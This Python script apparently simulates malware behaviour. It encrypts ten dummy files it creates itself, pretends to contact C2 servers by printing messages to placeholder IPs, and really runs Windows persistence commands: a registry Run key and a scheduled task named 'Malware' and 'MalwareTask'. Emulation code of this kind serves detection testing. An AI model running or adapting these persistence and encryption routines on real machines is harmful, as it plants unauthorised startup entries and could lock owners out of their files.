import os
import threading
from cryptography.fernet import Fernet
import subprocess
import time
import random

def encrypt_files():
    """Encrypt files in a target directory."""
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open(".encryption_key", "wb") as f:
        f.write(key)

    target_dir = "C:\\Users\\Public\\Documents\\Sensitive_Files"
    os.makedirs(target_dir, exist_ok=True)

    for i in range(10):
        file_path = os.path.join(target_dir, f"file_{i}.txt")
        with open(file_path, "w") as f:
            f.write("Confidential data.")
        with open(file_path, "rb") as f:
            encrypted_data = cipher.encrypt(f.read())
        with open(file_path, "wb") as f:
            f.write(encrypted_data)

    print(f"[INFO] Files encrypted in {target_dir}")

def establish_persistence():
    """Establish persistence using registry keys and scheduled tasks."""
    reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Malware" /t REG_SZ /d "{os.path.abspath(__file__)}" /f'
    subprocess.run(reg_command, shell=True)
    print("[INFO] Registry persistence established.")

    task_command = f'schtasks /create /tn "MalwareTask" /tr "{os.path.abspath(__file__)}" /sc daily /st 00:00'
    subprocess.run(task_command, shell=True)
    print("[INFO] Scheduled task created for persistence.")

def simulate_c2_communication():
    """Simulate Command-and-Control communication."""
    server_ips = ["198.51.100.25", "203.0.113.40"]
    for _ in range(5):
        ip = random.choice(server_ips)
        print(f"[INFO] Sending heartbeat to C2 server at {ip}")
        time.sleep(random.randint(10, 30))

if __name__ == "__main__":
    threads = [
        threading.Thread(target=encrypt_files),
        threading.Thread(target=establish_persistence),
        threading.Thread(target=simulate_c2_communication),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()